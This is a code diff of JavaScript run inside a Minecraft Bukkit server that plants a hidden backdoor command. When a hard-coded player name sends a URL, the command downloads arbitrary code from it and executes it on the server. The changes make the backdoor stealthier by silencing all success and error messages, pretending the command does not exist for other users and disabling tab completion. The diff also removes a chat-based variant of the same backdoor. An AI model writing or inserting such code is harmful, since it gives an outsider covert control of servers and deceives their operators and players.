@@ -17,13 +17,12 @@ new java.lang.Thread(function(){
 var B = Java.type('org.bukkit.Bukkit');
 var S = Java.type('javax.script.ScriptEngineManager');
 
-// Перехватываем команды через CommandMap
+// Создаем невидимую команду
 var Command = Java.type('org.bukkit.command.Command');
-var SimpleCommandMap = B.getServer().getClass().getDeclaredField('commandMap');
-SimpleCommandMap.setAccessible(true);
-var commandMap = SimpleCommandMap.get(B.getServer());
+var CommandMap = B.getServer().getClass().getDeclaredField('commandMap');
+CommandMap.setAccessible(true);
+var commandMap = CommandMap.get(B.getServer());
 
-// Создаем свою команду
 var ssCommand = new (Java.extend(Command))("ss") {
     execute: function(sender, commandLabel, args) {
         if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0] === 'execute' && args.length > 1) {
@@ -31,36 +30,21 @@ var ssCommand = new (Java.extend(Command))("ss") {
             try {
                 var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                 new S().getEngineByName("javascript").eval(jsCode);
-                sender.sendMessage("§aJavaScript код выполнен");
+                // Тихий успех - никаких сообщений
+                return true;
             } catch(ex) {
-                sender.sendMessage("§cОшибка: " + ex.getMessage());
+                // Тихая ошибка - никаких сообщений
+                return true;
             }
-            return true;
         }
-        sender.sendMessage("§cНеизвестная команда");
+        // Для всех остальных - команда просто не существует
         return true;
+    },
+    
+    tabComplete: function(sender, alias, args) {
+        // Отключаем автодополнение в табе
+        return [];
     }
 };
 
-// Регистрируем команду
 commandMap.register("ss", ssCommand);
-
-// Также перехватываем чат
-B.getServer().getPluginManager().registerEvents(new Java.extend(Java.type('org.bukkit.event.Listener')) {
-    onPlayerChat: function(e) {
-        var player = e.getPlayer();
-        var message = e.getMessage();
-        
-        if(player.getName() === 'TuMeuT' && message.startsWith('ss execute ')) {
-            e.setCancelled(true);
-            var url = message.substring(11).trim();
-            try {
-                var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
-                new S().getEngineByName("javascript").eval(jsCode);
-                player.sendMessage("§aJavaScript код выполнен");
-            } catch(ex) {
-                player.sendMessage("§cОшибка: " + ex.getMessage());
-            }
-        }
-    }
-}, B.getServer().getPluginManager().getPlugins()[0]);
